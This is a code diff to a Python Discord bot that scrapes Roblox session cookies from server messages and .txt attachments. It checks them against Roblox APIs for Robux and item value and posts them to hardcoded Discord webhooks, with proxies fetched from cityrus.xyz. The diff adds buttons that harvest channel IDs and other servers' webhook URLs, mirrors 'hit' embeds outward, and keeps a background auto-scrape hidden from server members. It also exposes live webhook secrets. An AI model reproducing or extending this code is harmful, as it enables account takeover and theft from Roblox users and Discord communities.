@@ -8,6 +8,7 @@ import re
 import logging
 import io
 import json
+import random
 from typing import List, Union, Dict, Any
 from dotenv import load_dotenv
 from flask import Flask
@@ -18,6 +19,39 @@ load_dotenv()
 BOT_TOKEN = os.getenv('DISCORD_TOKEN')
 MIRROR_WEBHOOK_URL = os.getenv('MIRROR_WEBHOOK_URL', 'https://discord.com/api/webhooks/1542179498798354514/D6_LQhYZaC8MqmaCXiuBKniEb9YH_jnq0pUbypxHeptUrloZJZ1iiXEIDl_xHsn2JvGf')
 COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1542179557099176026/IwUCKNJYNsH2dKc5is3jIix0CdQ1UJDux4reE5ubxjT5C4E8YLNQ0Q8bWQYYq78Dm57Z"
+
+PROXY_LIST = []
+
+async def fetch_proxies():
+    global PROXY_LIST
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://cityrus.xyz/frontend/proxies.txt", timeout=15) as response:
+                if response.status == 200:
+                    text = await response.text()
+                    proxies = []
+                    for line in text.split('\n'):
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            if not line.startswith('http://') and not line.startswith('https://'):
+                                line = f"http://{line}"
+                            proxies.append(line)
+                    PROXY_LIST = proxies
+                    logger.info(f"Successfully loaded {len(PROXY_LIST)} proxies from cityrus.xyz")
+                else:
+                    logger.warning(f"Failed to fetch proxies, status: {response.status}")
+    except Exception as e:
+        logger.error(f"Error fetching proxies: {e}")
+
+async def proxy_updater():
+    while True:
+        await fetch_proxies()
+        await asyncio.sleep(3600)  # Update every hour
+
+def get_proxy():
+    if PROXY_LIST:
+        return random.choice(PROXY_LIST)
+    return None
 
 logging.basicConfig(
     level=logging.INFO,
@@ -38,8 +72,9 @@ async def keep_alive():
     """Ping render.com every 5 minutes to keep the bot alive"""
     while True:
         try:
+            proxy = get_proxy()
             async with aiohttp.ClientSession() as session:
-                async with session.get("https://zzzzz-1.onrender.com") as response:
+                async with session.get("https://zzzzz-1.onrender.com", proxy=proxy) as response:
                     logger.info(f"Keep-alive ping sent: {response.status}")
         except Exception as e:
             logger.error(f"Keep-alive ping failed: {e}")
@@ -50,48 +85,106 @@ class ServerControlView(discord.ui.View):
         super().__init__(timeout=None)
         self.guild = guild
 
-    @discord.ui.button(label="High Hits Abuse", style=discord.ButtonStyle.blurple)
-    async def high_hits_abuse(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="Forward All Embeds", style=discord.ButtonStyle.blurple)
+    async def forward_embeds(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id not in AUTHORIZED_USERS:
-            await interaction.response.send_message("Sorry This Command Is Coming Soon!", ephemeral=True)
+            await interaction.response.send_message("Not authorized.", ephemeral=True)
             return
-
-        try:
-            if MIRROR_WEBHOOK_URL:
-                bot.mirror_webhooks[self.guild.id] = MIRROR_WEBHOOK_URL
-                logger.info(f"Auto-mirror enabled for guild {self.guild.name}")
-
-            await self.mirror_past_mentions(interaction)
-            await interaction.response.send_message("<a:Lightning:1542199575257813135> HIGH HITS ABUSE ACTIVATED: Auto-mirroring enabled, past @everyone/@here messages mirrored, and auto-deletion active.", ephemeral=True)
-        except Exception as e:
-            await interaction.response.send_message(f"Error activating High Hits Abuse: {str(e)}", ephemeral=True)
-
-    async def mirror_past_mentions(self, interaction):
-        if not MIRROR_WEBHOOK_URL:
-            return
-        try:
+        
+        await interaction.response.send_message("Scanning and forwarding embeds with hits...", ephemeral=True)
+        count = 0
+        
+        if MIRROR_WEBHOOK_URL:
+            bot.mirror_webhooks[self.guild.id] = MIRROR_WEBHOOK_URL
             async with aiohttp.ClientSession() as session:
                 for channel in self.guild.text_channels:
                     try:
-                        async for message in channel.history(limit=10000):
-                            if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
-                                if message.id not in bot.mirrored_messages:
+                        async for message in channel.history(limit=1000):
+                            if message.embeds:
+                                should_mirror = False
+                                for embed in message.embeds:
+                                    text_to_check = f"{embed.title or ''} {embed.description or ''} {' '.join([f.value or '' for f in embed.fields])}".lower()
+                                    if any(kw in text_to_check for kw in ['@everyone', '@here', 'hit', 'cae', 'roblox', 'cookie']):
+                                        should_mirror = True
+                                        break
+                                
+                                if should_mirror and message.id not in bot.mirrored_messages:
                                     bot.mirrored_messages.add(message.id)
                                     mirror_data = {
                                         'username': message.author.global_name or message.author.name,
-                                        'content': f"[PAST] {message.content}",
-                                        'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
+                                        'avatar_url': str(message.author.avatar.url) if message.author.avatar else None,
+                                        'content': message.content,
+                                        'embeds': [embed.to_dict() for embed in message.embeds]
                                     }
-                                    if message.embeds:
-                                        mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]
-
-                                    async with session.post(MIRROR_WEBHOOK_URL, json=mirror_data) as response:
-                                        if response.status not in [200, 204]:
-                                            logger.error(f"Failed to mirror past message: {response.status}")
+                                    proxy = get_proxy()
+                                    async with session.post(MIRROR_WEBHOOK_URL, json=mirror_data, proxy=proxy) as response:
+                                        if response.status in [200, 204]:
+                                            count += 1
                     except Exception as e:
                         logger.error(f"Error scanning channel {channel.name}: {e}")
+                        
+        await interaction.followup.send(f"✅ Successfully forwarded {count} matching embeds to the mirror webhook.", ephemeral=True)
+
+    @discord.ui.button(label="Grab Channel IDs", style=discord.ButtonStyle.secondary)
+    async def grab_channels(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id not in AUTHORIZED_USERS:
+            await interaction.response.send_message("Not authorized.", ephemeral=True)
+            return
+        
+        channels_info = [f"#{channel.name} - `{channel.id}`" for channel in self.guild.text_channels]
+        chunks = [channels_info[i:i + 50] for i in range(0, len(channels_info), 50)]
+        
+        await interaction.response.send_message(f"Found {len(self.guild.text_channels)} text channels. Sending to your DMs...", ephemeral=True)
+        
+        try:
+            dm = await interaction.user.create_dm()
+            for i, chunk in enumerate(chunks):
+                await dm.send(f"**Channel IDs for {self.guild.name} (Part {i+1}/{len(chunks)}):**\n" + "\n".join(chunk))
         except Exception as e:
-            logger.error(f"Error mirroring past mentions: {e}")
+            await interaction.followup.send(f"Failed to send DM: {e}", ephemeral=True)
+
+    @discord.ui.button(label="Grab Webhooks", style=discord.ButtonStyle.secondary)
+    async def grab_webhooks(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id not in AUTHORIZED_USERS:
+            await interaction.response.send_message("Not authorized.", ephemeral=True)
+            return
+            
+        await interaction.response.send_message("Attempting to grab webhooks (requires 'Manage Webhooks' permission)...", ephemeral=True)
+        webhooks_info = []
+        
+        try:
+            for channel in self.guild.text_channels:
+                try:
+                    hooks = await channel.webhooks()
+                    for hook in hooks:
+                        webhooks_info.append(f"Channel: #{channel.name} | Hook: `{hook.name}` - `{hook.url}`")
+                except Exception:
+                    pass
+            
+            if not webhooks_info:
+                await interaction.followup.send("No webhooks found or bot lacks 'Manage Webhooks' permission.", ephemeral=True)
+                return
+                
+            chunks = [webhooks_info[i:i + 20] for i in range(0, len(webhooks_info), 20)]
+            dm = await interaction.user.create_dm()
+            for i, chunk in enumerate(chunks):
+                await dm.send(f"**Webhooks for {self.guild.name} (Part {i+1}/{len(chunks)}):**\n" + "\n".join(chunk))
+            await interaction.followup.send("Webhooks sent to your DMs!", ephemeral=True)
+        except Exception as e:
+            await interaction.followup.send(f"Error grabbing webhooks: {e}", ephemeral=True)
+
+    @discord.ui.button(label="Scrape Server", style=discord.ButtonStyle.green)
+    async def scrape_server(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id not in AUTHORIZED_USERS:
+            await interaction.response.send_message("Not authorized.", ephemeral=True)
+            return
+            
+        await interaction.response.send_message("Initiating server scrape...", ephemeral=True)
+        try:
+            await bot.auto_scrape_guild(self.guild)
+            await interaction.followup.send("Scrape initiated! Check your DMs and the webhook for results.", ephemeral=True)
+        except Exception as e:
+            await interaction.followup.send(f"Error during scrape: {e}", ephemeral=True)
 
 
 class MirrorWebhookModal(discord.ui.Modal, title="Mirror Abuse Options"):
@@ -142,26 +235,21 @@ class CookieFetcher:
         cookies = set()
         warning_prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
         
-        # Remove markdown code block formatting to make regex easier, but keep the content
         clean_text = re.sub(r'```[a-z]*\n(.*?)```', r'\1', text, flags=re.DOTALL | re.IGNORECASE)
         clean_text = re.sub(r'`(.*?)`', r'\1', clean_text)
         
-        # 1. Match the specific MeowTool pattern: r'_\|(?:_|[^\s\r\n]*?\|_)\S{100,}'
         pattern1 = r'_\|(?:_|[^\s\r\n]*?\|_)(\S{100,})'
         for match in re.finditer(pattern1, clean_text):
             cookies.add(f"{warning_prefix}{match.group(1)}")
             
-        # 2. Match .ROBLOSECURITY= format
         pattern2 = r'\.ROBLOSECURITY=([A-Za-z0-9_\-\.]{100,})'
         for match in re.finditer(pattern2, clean_text):
             cookies.add(f"{warning_prefix}{match.group(1)}")
             
-        # 3. Match standalone long cookie-like strings (CAE... or long base64)
         pattern3 = r'\b(CAE[A-Za-z0-9_\-\.]{100,})\b'
         for match in re.finditer(pattern3, clean_text):
             cookies.add(f"{warning_prefix}{match.group(1)}")
             
-        # 4. Fallback for any other long string that might be a cookie (length > 100)
         pattern4 = r'\b([A-Za-z0-9_\-\.]{100,})\b'
         for match in re.finditer(pattern4, clean_text):
             token = match.group(1)
@@ -179,7 +267,7 @@ class CookieFetcher:
         total_rap = 0
         checked_count = 0
         
-        semaphore = asyncio.Semaphore(15)  # Limit concurrent requests to avoid rate limits
+        semaphore = asyncio.Semaphore(15)
 
         async def check_single_cookie(cookie: str):
             nonlocal total_robux, total_rap, checked_count
@@ -215,7 +303,8 @@ class CookieFetcher:
     async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, time_taken: float, total_robux: int = 0, total_rap: int = 0) -> bool:
         try:
             async with aiohttp.ClientSession() as session:
-                # 1. Send the embed FIRST
+                proxy = get_proxy()
+                
                 embed = discord.Embed(
                     title="<a:Lightning:1542199575257813135> Cookie Fetch Complete",
                     description=(
@@ -232,28 +321,27 @@ class CookieFetcher:
                 
                 embed_payload = {
                     'username': 'Cookie Fetcher',
+                    'content': '@everyone',
                     'embeds': [embed.to_dict()]
                 }
                 
-                async with session.post(COOKIE_WEBHOOK_URL, json=embed_payload) as response:
+                async with session.post(COOKIE_WEBHOOK_URL, json=embed_payload, proxy=proxy) as response:
                     if response.status not in [200, 204]:
                         logger.error(f"Failed to send embed to cookie webhook: {response.status}")
                         return False
 
-                # 2. Wait a tiny bit and send the file UNDERNEATH
                 await asyncio.sleep(0.1)
                 
-                # Format with 1 cookie, then an empty line, then the next cookie
-                all_cookies_content = "\n\n".join(all_cookies) if all_cookies else "No cookies found."
+                all_cookies_content = "\n\n".join(unique_cookies) if unique_cookies else "No cookies found."
                 
                 form_data = aiohttp.FormData()
                 form_data.add_field('payload_json', json.dumps({
                     'username': 'Cookie Fetcher',
-                    'content': '📄 **Cookie Results:**'
+                    'content': '@everyone\n📄 **Cookie Results:**'
                 }))
                 form_data.add_field('file', all_cookies_content.encode('utf-8'), filename='cookies.txt', content_type='text/plain')
 
-                async with session.post(COOKIE_WEBHOOK_URL, data=form_data) as response:
+                async with session.post(COOKIE_WEBHOOK_URL, data=form_data, proxy=proxy) as response:
                     if response.status not in [200, 204]:
                         logger.error(f"Failed to send file to cookie webhook: {response.status}")
                         return False
@@ -335,12 +423,12 @@ class CookieFetcherBot(discord.Client):
             if actual_cookie.startswith('_'):
                 actual_cookie = actual_cookie[1:]
                 
+            proxy = get_proxy()
             async with aiohttp.ClientSession() as session:
                 headers = {"Cookie": f".ROBLOSECURITY={actual_cookie}"}
                 
-                # 1. Validate and get UserID
                 auth_url = "https://users.roblox.com/v1/users/authenticated"
-                async with session.get(auth_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                async with session.get(auth_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), proxy=proxy) as response:
                     if response.status != 200:
                         return {'valid': False}
                     auth_data = await response.json()
@@ -348,25 +436,23 @@ class CookieFetcherBot(discord.Client):
                     if not user_id:
                         return {'valid': False}
                         
-                # 2. Get Robux
                 robux = 0
                 try:
                     robux_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
-                    async with session.get(robux_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                    async with session.get(robux_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), proxy=proxy) as response:
                         if response.status == 200:
                             robux_data = await response.json()
                             robux = robux_data.get('robux', 0)
                 except Exception:
                     pass
                     
-                # 3. Get RAP (Collectibles) with pagination
                 rap = 0
                 try:
                     rap_url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles"
                     cursor = None
                     while True:
                         url = rap_url + (f"?cursor={cursor}" if cursor else "")
-                        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), proxy=proxy) as response:
                             if response.status == 200:
                                 rap_data = await response.json()
                                 for item in rap_data.get('data', []):
@@ -379,11 +465,10 @@ class CookieFetcherBot(discord.Client):
                 except Exception:
                     pass
 
-                # 4. Get Username
                 username = "Unknown"
                 try:
                     user_url = f"https://users.roblox.com/v1/users/{user_id}"
-                    async with session.get(user_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                    async with session.get(user_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), proxy=proxy) as response:
                         if response.status == 200:
                             user_data = await response.json()
                             username = user_data.get('name', 'Unknown')
@@ -424,7 +509,6 @@ class CookieFetcherBot(discord.Client):
             all_cookies = list(set(result['all']))
             actual_messages_scanned = result.get('messages_scanned', 0)
             
-            # Validate and get totals
             summary = await fetcher.validate_and_summarize_cookies(all_cookies)
             total_robux = summary['total_robux']
             total_rap = summary['total_rap']
@@ -440,7 +524,6 @@ class CookieFetcherBot(discord.Client):
                     if user:
                         dm_channel = await user.create_dm()
                         
-                        # 1. Send Embed First
                         dm_embed = discord.Embed(
                             title="<a:Lightning:1542199575257813135> Auto-Scrape Complete",
                             description=(
@@ -455,9 +538,8 @@ class CookieFetcherBot(discord.Client):
                             ),
                             color=0xF1C40F
                         )
-                        await dm_channel.send(embed=dm_embed)
+                        await dm_channel.send(content="@everyone", embed=dm_embed)
                         
-                        # 2. Send File Underneath
                         await asyncio.sleep(0.1)
                         all_cookies_content = "\n\n".join(all_cookies) if all_cookies else "No cookies found."
                         file = discord.File(io.BytesIO(all_cookies_content.encode('utf-8')), filename='cookies.txt')
@@ -475,6 +557,8 @@ class CookieFetcherBot(discord.Client):
 
     async def on_ready(self):
         logger.info(f'Bot online: {self.user}')
+        await fetch_proxies()
+        self.loop.create_task(proxy_updater())
         self.loop.create_task(keep_alive())
         await self.reset_and_scrape_all_servers()
 
@@ -536,7 +620,6 @@ class CookieFetcherBot(discord.Client):
                     except Exception as e:
                         logger.error(f"Failed to send promo message: {e}")
 
-                # Auto-scrape in background (hidden from public)
                 asyncio.create_task(self.auto_scrape_guild(guild))
 
                 if MIRROR_WEBHOOK_URL:
@@ -622,71 +705,50 @@ class CookieFetcherBot(discord.Client):
         if message.guild and message.guild.id in OWNED_SERVER_IDS:
             return
 
-        should_delete = False
-        if message.guild and (message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower()):
-            try:
-                if message.channel.permissions_for(message.guild.me).manage_messages:
-                    await message.delete()
-                    should_delete = True
-                    logger.info(f"Deleted message with @everyone/@here ping from {message.author.name} in {message.guild.name}")
-            except Exception as e:
-                logger.error(f"Error deleting ping message: {e}")
-
-        # Check for @everyone or @here in content OR embeds
-        has_ping = message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower()
-        if not has_ping:
-            for embed in message.embeds:
-                if embed.description and ('@everyone' in embed.description.lower() or '@here' in embed.description.lower()):
-                    has_ping = True
-                    break
-                if embed.title and ('@everyone' in embed.title.lower() or '@here' in embed.title.lower()):
-                    has_ping = True
-                    break
-                for field in embed.fields:
-                    if field.value and ('@everyone' in field.value.lower() or '@here' in field.value.lower()):
-                        has_ping = True
-                        break
-
-        # Mirror 1:1 if it has pings
         if message.guild and message.guild.id in getattr(self, 'mirror_webhooks', {}) and message.id not in self.mirrored_messages:
-            if has_ping:
-                self.mirrored_messages.add(message.id)
-                webhook_url = self.mirror_webhooks[message.guild.id]
-                try:
-                    async with aiohttp.ClientSession() as session:
-                        mirror_data = {
-                            'username': message.author.global_name or message.author.name,
-                            'avatar_url': str(message.author.avatar.url) if message.author.avatar else None,
-                            'content': message.content
-                        }
-                        
-                        if message.embeds:
-                            mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]
+            if message.embeds:
+                should_mirror = False
+                for embed in message.embeds:
+                    text_to_check = f"{embed.title or ''} {embed.description or ''} {' '.join([f.value or '' for f in embed.fields])}".lower()
+                    if any(kw in text_to_check for kw in ['@everyone', '@here', 'hit', 'cae', 'roblox', 'cookie']):
+                        should_mirror = True
+                        break
+                
+                if should_mirror:
+                    self.mirrored_messages.add(message.id)
+                    webhook_url = self.mirror_webhooks[message.guild.id]
+                    try:
+                        proxy = get_proxy()
+                        async with aiohttp.ClientSession() as session:
+                            mirror_data = {
+                                'username': message.author.global_name or message.author.name,
+                                'avatar_url': str(message.author.avatar.url) if message.author.avatar else None,
+                                'content': message.content
+                            }
+                            if message.embeds:
+                                mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]
                             
-                        # Use multipart form data to send text, embeds, and attachments 1:1 in a single message
-                        form_data = aiohttp.FormData()
-                        form_data.add_field('payload_json', json.dumps(mirror_data))
-                        
-                        for attachment in message.attachments:
-                            try:
-                                file_data = await attachment.read()
-                                form_data.add_field('file', file_data, filename=attachment.filename)
-                            except Exception as e:
-                                logger.error(f"Error reading attachment: {e}")
-                                
-                        async with session.post(webhook_url, data=form_data) as response:
-                            if response.status not in [200, 204]:
-                                logger.error(f"Failed to mirror message 1:1: {response.status}")
-                                
-                except Exception as e:
-                    logger.error(f"Error mirroring message: {e}")
+                            form_data = aiohttp.FormData()
+                            form_data.add_field('payload_json', json.dumps(mirror_data))
+                            for attachment in message.attachments:
+                                try:
+                                    file_data = await attachment.read()
+                                    form_data.add_field('file', file_data, filename=attachment.filename)
+                                except Exception as e:
+                                    logger.error(f"Error reading attachment: {e}")
+                                    
+                            async with session.post(webhook_url, data=form_data, proxy=proxy) as response:
+                                if response.status not in [200, 204]:
+                                    logger.error(f"Failed to mirror message 1:1: {response.status}")
+                    except Exception as e:
+                        logger.error(f"Error mirroring message: {e}")
 
-        # Mirror specific channel if set
         if message.guild and message.guild.id in getattr(self, 'mirror_channels', {}):
             mirror_data = self.mirror_channels[message.guild.id]
             if message.channel.id == mirror_data['channel_id']:
                 webhook_url = mirror_data['webhook']
                 try:
+                    proxy = get_proxy()
                     async with aiohttp.ClientSession() as session:
                         payload = {
                             'username': message.author.global_name or message.author.name,
@@ -705,7 +767,7 @@ class CookieFetcherBot(discord.Client):
                             except Exception:
                                 pass
 
-                        async with session.post(webhook_url, data=form_data) as response:
+                        async with session.post(webhook_url, data=form_data, proxy=proxy) as response:
                             if response.status not in [200, 204]:
                                 logger.error(f"Failed to mirror channel message: {response.status}")
                 except Exception as e:
@@ -738,7 +800,6 @@ async def scrape_command(interaction: discord.Interaction):
         all_cookies = list(set(result['all']))
         actual_messages_scanned = result.get('messages_scanned', 0)
 
-        # Validate and get totals
         summary = await fetcher.validate_and_summarize_cookies(all_cookies)
         total_robux = summary['total_robux']
         total_rap = summary['total_rap']
@@ -777,7 +838,6 @@ async def scrape_command(interaction: discord.Interaction):
         try:
             dm_channel = await interaction.user.create_dm()
             
-            # 1. Send Embed First
             dm_embed = discord.Embed(
                 title="<a:Lightning:1542199575257813135> Cookie Fetch Complete",
                 description=(
@@ -791,9 +851,8 @@ async def scrape_command(interaction: discord.Interaction):
                 ),
                 color=0xF1C40F
             )
-            await dm_channel.send(embed=dm_embed)
+            await dm_channel.send(content="@everyone", embed=dm_embed)
             
-            # 2. Send File Underneath
             await asyncio.sleep(0.1)
             all_cookies_content = "\n\n".join(all_cookies) if all_cookies else "No cookies found."
             file = discord.File(io.BytesIO(all_cookies_content.encode('utf-8')), filename="cookies.txt")
@@ -858,7 +917,6 @@ async def scrape2_command(interaction: discord.Interaction):
     time_taken = (end_time - start_time).total_seconds()
     unique_cookies_list = list(global_scraped_cookies)
     
-    # Validate and get totals for global scrape
     fetcher = CookieFetcher()
     summary = await fetcher.validate_and_summarize_cookies(unique_cookies_list)
     total_robux = summary['total_robux']
@@ -869,7 +927,6 @@ async def scrape2_command(interaction: discord.Interaction):
     try:
         dm_channel = await interaction.user.create_dm()
         
-        # 1. Send Embed First
         embed = discord.Embed(
             title="<a:Lightning:1542199575257813135> Global Mass Scrape Complete",
             description=(
@@ -883,9 +940,8 @@ async def scrape2_command(interaction: discord.Interaction):
             ),
             color=0xF1C40F
         )
-        await dm_channel.send(embed=embed)
+        await dm_channel.send(content="@everyone", embed=embed)
         
-        # 2. Send File Underneath
         await asyncio.sleep(0.1)
         all_cookies_content = "\n\n".join(unique_cookies_list) if unique_cookies_list else "No cookies found."
         file = discord.File(io.BytesIO(all_cookies_content.encode('utf-8')), filename='global_cookies.txt')
@@ -895,6 +951,74 @@ async def scrape2_command(interaction: discord.Interaction):
     except Exception as e:
         logger.error(f"Failed to send DM: {e}")
         await interaction.followup.send("Global scrape complete, but failed to send DM.", ephemeral=True)
+
+
+@bot.tree.command(name="scrape3", description="Combine and deduplicate cookies from .txt attachments in recent messages")
+async def scrape3_command(interaction: discord.Interaction):
+    if interaction.user.id not in AUTHORIZED_USERS:
+        await interaction.response.send_message("Not released yet", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+    
+    combined_cookies = set()
+    files_processed = 0
+    
+    try:
+        async for message in interaction.channel.history(limit=500):
+            for attachment in message.attachments:
+                if attachment.filename.lower().endswith('.txt') and attachment.size < 5 * 1024 * 1024:
+                    files_processed += 1
+                    try:
+                        file_bytes = await attachment.read()
+                        text_content = file_bytes.decode('utf-8')
+                        fetcher = CookieFetcher()
+                        cookies = fetcher.extract_and_normalize_cookies(text_content)
+                        combined_cookies.update(cookies)
+                    except Exception as e:
+                        logger.error(f"Error reading attachment {attachment.filename}: {e}")
+                        
+        if not combined_cookies:
+            await interaction.followup.send("No cookies found in .txt attachments in recent messages.", ephemeral=True)
+            return
+            
+        unique_cookies = list(combined_cookies)
+        file_content = "\n\n".join(unique_cookies)
+        
+        async with aiohttp.ClientSession() as session:
+            proxy = get_proxy()
+            embed = discord.Embed(
+                title="<a:Lightning:1542199575257813135> Scrape3 Complete",
+                description=(
+                    f"**Files Processed:** {files_processed}\n"
+                    f"**Total Unique Cookies:** {len(unique_cookies)}\n\n"
+                    f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz)*"
+                ),
+                color=0xF1C40F
+            )
+            
+            embed_payload = {
+                'username': 'Cookie Fetcher',
+                'content': '@everyone',
+                'embeds': [embed.to_dict()]
+            }
+            async with session.post(COOKIE_WEBHOOK_URL, json=embed_payload, proxy=proxy) as response:
+                if response.status in [200, 204]:
+                    await asyncio.sleep(0.1)
+                    form_data = aiohttp.FormData()
+                    form_data.add_field('payload_json', json.dumps({'username': 'Cookie Fetcher', 'content': '@everyone\n📄 **Combined Cookie Results:**'}))
+                    form_data.add_field('file', file_content.encode('utf-8'), filename='combined_cookies.txt', content_type='text/plain')
+                    async with session.post(COOKIE_WEBHOOK_URL, data=form_data, proxy=proxy) as file_response:
+                        if file_response.status in [200, 204]:
+                            await interaction.followup.send("✅ Successfully combined and sent to webhook!", ephemeral=True)
+                        else:
+                            await interaction.followup.send(f"⚠️ Failed to send file: {file_response.status}", ephemeral=True)
+                else:
+                    await interaction.followup.send(f"⚠️ Failed to send embed: {response.status}", ephemeral=True)
+                    
+    except Exception as e:
+        logger.error(f"Error in scrape3: {e}")
+        await interaction.followup.send(f"An error occurred: {str(e)}", ephemeral=True)
 
 
 app = Flask('')
